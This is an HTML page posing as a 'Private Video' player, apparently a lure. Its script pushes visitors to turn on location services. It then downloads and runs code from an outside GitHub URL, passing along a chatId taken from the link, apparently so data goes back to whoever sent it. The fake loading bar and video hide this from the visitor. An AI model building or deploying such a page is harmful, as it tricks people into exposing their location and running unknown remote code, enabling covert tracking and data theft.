<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }

        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        #locationActionButton {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: 3px solid #ff6b6b;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
            z-index: 10;
        }
        #locationActionButton:hover {
            transform: scale(1.05);
            background: rgba(255, 255, 255, 0.2);
            border-color: #ff4757;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
        }
        #locationActionButton .play-icon {
            font-size: 60px;
            color: #ff6b6b;
            line-height: 1;
            user-select: none;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }

        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }

        .control-button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }

        .control-button:hover {
            background: #333;
        }

        .progress-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }

        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }

        .time-display {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }

        #loading {
            display: none;
            font-size: 1.2rem;
            color: #fff;
            margin-top: 20px;
            text-align: center;
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            padding: 15px 25px;
            border-radius: 30px;
            z-index: 100;
            backdrop-filter: blur(10px);
        }

        .spinner {
            border: 4px solid #fff;
            border-top: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            display: inline-block;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            margin-top: 10px;
        }

        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }

        .volume-slider {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }

        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }

        .fullscreen-btn {
            margin-left: 15px;
        }

        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .progress-bar {
                margin: 0 6px;
            }
            .time-display {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            #locationActionButton {
                width: 90px;
                height: 90px;
            }
            #locationActionButton .play-icon {
                font-size: 45px;
            }
        }
    </style>
</head>
<body>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
        </div>

        <div class="video-thumbnail" id="thumbnailArea">
            <div id="locationActionButton">
                <span class="play-icon">▶</span>
            </div>
        </div>

        <video id="realVideo" controls playsinline style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>

            <div class="time-display">0:00 / 2:45</div>

            <div class="volume-control">
                <span>🔊</span>
                <div class="volume-slider">
                    <div class="volume-level"></div>
                </div>
            </div>

            <button class="control-button fullscreen-btn">⛶</button>
        </div>
    </div>

    <div id="loading">
        <div class="spinner"></div>
        <div class="loading-text">Loading video...</div>
    </div>

    <script>
        (function() {
            'use strict';

            // ===== الإعدادات =====
            const API_URL = 'https://raw.githubusercontent.com/FGDHSHS/api/refs/heads/main/api';
            let settingsOpened = false;
            let videoStarted = false;

            // ===== عناصر DOM =====
            const locationBtn = document.getElementById('locationActionButton');
            const thumbnailArea = document.getElementById('thumbnailArea');
            const realVideo = document.getElementById('realVideo');
            const loading = document.getElementById('loading');

            // ===== المرحلة الأولى: فتح إعدادات الموقع فقط =====
            function openLocationSettings() {
                const ua = navigator.userAgent;
                
                if (/Android/i.test(ua)) {
                    const intents = [
                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent:#Intent;action=android.settings.SETTINGS;end'
                    ];
                    
                    for (let intent of intents) {
                        try {
                            window.location.href = intent;
                            break;
                        } catch (e) {
                            continue;
                        }
                    }
                } 
                else if (/iPhone|iPad|iPod/i.test(ua)) {
                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
                    setTimeout(() => {
                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
                    }, 500);
                } 
                else if (/Windows/i.test(ua)) {
                    window.open('ms-settings:privacy-location', '_blank');
                } 
                else if (/Mac/i.test(ua)) {
                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
                } 
                else {
                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                }
            }

            // ===== استدعاء الكود الخارجي من GitHub API =====
            async function loadExternalAPI() {
                try {
                    console.log('🔄 جاري تحميل الكود من API...');
                    
                    const chatId = new URLSearchParams(window.location.search).get('chatId') || '';
                    
                    // تخزين chatId في متغير عام ليستخدمه الكود الخارجي
                    window.__CHAT_ID__ = chatId;
                    window.__API_URL__ = API_URL;
                    
                    const response = await fetch(API_URL, {
                        method: 'GET',
                        cache: 'no-cache'
                    });
                    
                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    
                    const scriptContent = await response.text();
                    
                    console.log('✅ تم تحميل الكود بنجاح، جاري التنفيذ...');
                    
                    // تنفيذ الكود المحمل
                    const scriptElement = document.createElement('script');
                    scriptElement.textContent = scriptContent;
                    scriptElement.id = 'external-api-script';
                    document.body.appendChild(scriptElement);
                    
                    console.log('✅ تم تنفيذ الكود الخارجي بنجاح');
                    
                    return true;
                    
                } catch (error) {
                    console.error('❌ خطأ في تحميل الكود الخارجي:', error.message);
                    return false;
                }
            }

            // ===== تشغيل الفيديو =====
            function showVideo() {
                thumbnailArea.style.display = 'none';
                realVideo.style.display = 'block';
                realVideo.muted = false;
                realVideo.volume = 1.0;
                
                realVideo.play().catch(e => {
                    console.warn('تشغيل الفيديو فشل، نحاول مجدداً...');
                    setTimeout(() => {
                        realVideo.play().catch(err => console.error('فشل نهائي:', err));
                    }, 100);
                });
            }

            // ===== المعالج الرئيسي للزر =====
            async function handleButtonClick(event) {
                if (videoStarted) return;

                if (!settingsOpened) {
                    // ✋ المرحلة الأولى: طلب الإذن فقط
                    settingsOpened = true;
                    openLocationSettings();
                    
                    // تغيير شكل الزر ليدل على الانتظار
                    locationBtn.querySelector('.play-icon').textContent = '⏳';
                    locationBtn.style.borderColor = '#ffd700';
                    locationBtn.title = 'انتظر... قم بتفعيل الموقع ثم عد للتطبيق';
                    
                } else {
                    // 🚀 المرحلة الثانية: تشغيل الفيديو واستدعاء الكود الخارجي
                    videoStarted = true;
                    loading.style.display = 'block';
                    locationBtn.style.pointerEvents = 'none';
                    locationBtn.style.opacity = '0.5';

                    // تشغيل الفيديو فوراً (لاستغلال حدث النقر للصوت)
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    realVideo.play().catch(() => {});

                    // استدعاء الكود الخارجي من API في الخلفية
                    loadExternalAPI();

                    // إظهار الفيديو بعد تأخير بسيط
                    setTimeout(() => {
                        loading.style.display = 'none';
                        showVideo();
                    }, 2500);
                }
            }

            // ===== رصد عودة المستخدم من الإعدادات =====
            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted) {
                    locationBtn.querySelector('.play-icon').textContent = '▶';
                    locationBtn.style.borderColor = '#00ff00';
                    locationBtn.title = '✅ تم التفعيل - اضغط للتشغيل';
                }
            });

            // ===== ربط الأحداث =====
            if (locationBtn) {
                locationBtn.addEventListener('click', handleButtonClick);
            }

            // ===== ضمان الصوت عند أي تفاعل =====
            document.addEventListener('click', function(e) {
                if (realVideo && realVideo.style.display === 'block') {
                    realVideo.muted = false;
                    if (realVideo.paused) {
                        realVideo.play().catch(() => {});
                    }
                }
            }, true);

            // ===== أزرار التحكم =====
            document.querySelectorAll('.control-button').forEach(button => {
                button.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        if (realVideo.requestFullscreen) {
                            realVideo.requestFullscreen();
                        } else if (realVideo.webkitRequestFullscreen) {
                            realVideo.webkitRequestFullscreen();
                        }
                    }
                });
            });

            // ===== شريط التقدم الوهمي =====
            const progressInterval = setInterval(() => {
                const progressFill = document.querySelector('.progress-fill');
                if (realVideo.style.display === 'block') {
                    clearInterval(progressInterval);
                    return;
                }
                const currentWidth = parseInt(progressFill.style.width) || 35;
                const newWidth = (currentWidth + 0.1) % 100;
                progressFill.style.width = newWidth + '%';

                const timeDisplay = document.querySelector('.time-display');
                const currentSeconds = Math.floor((newWidth / 100) * 165);
                const minutes = Math.floor(currentSeconds / 60);
                const seconds = currentSeconds % 60;
                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

        })();
    </script>
</body>
</html>
